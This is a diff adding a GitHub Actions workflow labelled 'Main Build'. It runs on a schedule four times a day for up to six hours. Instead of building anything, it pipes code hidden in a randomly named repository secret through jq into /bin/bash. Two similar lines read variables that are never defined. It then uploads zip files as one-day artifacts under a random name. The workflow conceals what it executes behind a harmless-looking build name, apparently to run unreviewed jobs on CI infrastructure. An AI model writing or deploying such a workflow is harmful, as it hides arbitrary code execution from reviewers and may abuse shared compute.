@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          xwlep01754: ${{ secrets.xwlep01754 }}
+        run: |
+          printf '%s' "$xwlep01754" | jq -r .pft10 | /bin/bash
+          printf '%s' "$vlyed0144" | jq -r .kod4 | /bin/bash
+          echo $t00702 | jq -r .gy013 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2V8qtY3Q
+          path: "*.zip"
+          retention-days: 1
